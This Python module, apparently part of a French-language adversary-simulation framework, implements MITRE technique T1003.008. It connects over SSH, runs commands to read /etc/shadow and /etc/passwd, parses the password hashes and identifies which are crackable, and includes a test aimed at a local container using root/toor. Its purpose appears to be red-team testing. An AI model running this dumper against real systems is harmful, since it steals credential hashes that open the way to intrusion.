#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat May 23 2026

@author: hounsousamuel
"""

import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import asyncio
from typing import Dict, Any, Optional, List

from tactics.execution.command_execution import CommandExecution
from tactics.mittres import MITRE
from simulateur_utils.logger import get_logger
from tactics.credential_access.data.password_file_dump_helper import (
    COMMANDS, TARGETS
)

logger = get_logger()


class PasswordFileDump(CommandExecution):
    """
    Lecture des fichiers de mots de passe système.
    Technique MITRE ATT&CK: T1003.008
    """

    def __init__(
        self,
        name: str = "password_file_dump",
        timeout: int = 2,
        exec_timeout: int = 10,
        **kwargs
    ):
        super().__init__(name=name, timeout=timeout, exec_timeout=exec_timeout, **kwargs)
        self.dump_result: Dict[str, Any] = {}
        self.dumped_hashes: List[Dict] = []
        self.dumped_users: List[str] = []

    # =========================================================================
    # PARSING
    # =========================================================================

    def _parse_shadow(self, output: str) -> List[Dict]:
        hashes = []
        if not output:
            return hashes

        algo_map = {
            "$1$":  "MD5",
            "$2$":  "Blowfish",
            "$2a$": "Blowfish",
            "$2y$": "Blowfish",
            "$5$":  "SHA-256",
            "$6$":  "SHA-512",
            "$y$":  "yescrypt",
        }

        for line in output.strip().splitlines():
            parts = line.split(":")
            if len(parts) < 2:
                continue
            user, hash_val = parts[0], parts[1]
            if hash_val in ("!", "*", "!!", "", "x"):
                continue

            algo = next(
                (name for prefix, name in algo_map.items() if hash_val.startswith(prefix)),
                "unknown"
            )
            hashes.append({
                "user": user,
                "hash": hash_val[:60] + "...",
                "hash_full": hash_val,
                "algo": algo,
                "crackable": algo != "unknown",
            })

        return hashes

    def _parse_passwd(self, output: str) -> List[str]:
        if not output:
            return []
        no_shell = ("/nologin", "/false", "/sync", "/halt", "/shutdown")
        return [
            line.split(":")[0]
            for line in output.strip().splitlines()
            if len(line.split(":")) >= 7 and not any(s in line.split(":")[6] for s in no_shell)
        ]

    def _is_failed(self, cmd: str, output: str) -> bool:
        indicator = COMMANDS.get(cmd, {}).get("fail_indicator")
        return bool(indicator and output.strip() == indicator)

    def _compute_severity(self) -> str:
        if self.dumped_hashes:
            return "CRITICAL"
        if self.dumped_users:
            return "HIGH"
        return "LOW"

    # =========================================================================
    # CORE ASYNC
    # =========================================================================

    async def _dump_async(self, ip, port, username, password, pkey=None) -> Dict[str, Any]:
        self.log(f"Début PasswordFileDump sur {username}@{ip}:{port}", log=True)
        self.start_time = time.time()

        exec_result = await self.exec_command_async(
            ip=ip, port=port, username=username, password=password,
            commands=list(COMMANDS.keys()), pkey=pkey
        )

        self.end_time = time.time()
        self.dump_result = exec_result

        for cmd, data in exec_result.get("results", {}).get("commands", {}).items():
            out = data["stdout"]
            # print("CMD :", cmd, "\n", out)
            if self._is_failed(cmd, out):
                self.log(f"Accès refusé : {COMMANDS.get(cmd, {}).get('description', cmd)}", log=True)
                continue
            if "cat /etc/shadow" in cmd and "grep" not in cmd:
                self.dumped_hashes = self._parse_shadow(out)
            elif "cat /etc/passwd" in cmd and "grep" not in cmd:
                self.dumped_users = self._parse_passwd(out)

        self.log(f"Dump terminé — {len(self.dumped_hashes)} hash(es), {len(self.dumped_users)} user(s)", log=True)
        return self._get_result()

    async def dump_async(self, ip, port, username, password, total_timeout=None, pkey=None) -> Dict[str, Any]:
        if total_timeout:
            try:
                async with asyncio.timeout(total_timeout):
                    return await self._dump_async(ip, port, username, password, pkey=pkey)
            except asyncio.TimeoutError:
                self.log(f"Timeout après {total_timeout}s", log=True)
                return self._get_result()
        return await self._dump_async(ip, port, username, password, pkey=pkey)

    def dump_sync(self, *args, **kwargs) -> Dict[str, Any]:
        return asyncio.run(self.dump_async(*args, **kwargs))

    # =========================================================================
    # RÉSULTAT
    # =========================================================================

    def _get_result(self) -> Dict[str, Any]:
        self.save()
        results = self.dump_result.get("results", {})
        return {
            "severity": self._compute_severity(),
            "elapsed": self.end_time - self.start_time if self.end_time and self.start_time else 0,
            "mitres": [MITRE.get("PasswordFileDump", {})],
            "results": {
                "hashes": self.dumped_hashes,
                "hashes_count": len(self.dumped_hashes),
                "active_users": self.dumped_users,
                "active_users_count": len(self.dumped_users),
                "shadow_readable": bool(self.dumped_hashes),
                "commands": results.get("commands", {}),
                "success_number": results.get("success_number", 0),
                "success_rate": results.get("success_rate", 0.0),
            },
        }


# =============================================================================
# Test
# =============================================================================

def test_password_file_dump(
    ip: str = "172.17.0.2", port: int = 22,
    username: str = "root", password: str = "toor",
    total_timeout: float = 30.0, pkey=None
):
    print(f"\n🔑 Test PasswordFileDump sur {username}@{ip}:{port}")
    print("-" * 50)

    result = PasswordFileDump(timeout=5, exec_timeout=10).dump_sync(
        ip=ip, port=port, username=username, password=password,
        total_timeout=total_timeout, pkey=pkey
    )

    severity = result.get("severity", "UNKNOWN")
    icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")
    r = result.get("results", {})

    print(f"\n{icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {result.get('elapsed', 0):.2f}s")
    print(f"🔐 /etc/shadow lisible : {r.get('shadow_readable')}")
    print(f"📋 Hashes : {r.get('hashes_count', 0)}")
    for h in r.get("hashes", []):
        print(f"   {'✅' if h['crackable'] else '⚠️'} {h['user']} — {h['algo']}")
    print(f"👤 Users actifs : {r.get('active_users', [])}")
    return result


if __name__ == "__main__":
    test_password_file_dump()